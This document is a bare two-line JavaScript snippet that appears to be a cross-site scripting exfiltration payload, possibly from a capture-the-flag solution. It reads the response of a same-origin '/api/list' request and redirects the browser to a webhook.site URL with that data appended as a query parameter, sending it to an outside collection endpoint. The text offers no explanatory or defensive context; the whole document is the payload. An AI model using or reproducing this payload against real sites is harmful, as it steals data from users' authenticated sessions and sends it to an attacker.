fetch('/api/list').then(r=>r.text())
        .then(r=>location = "https://webhook.site/19a77aa6-a445-47eb-9ae2-05a1d74c00e4/meow?c="+r)
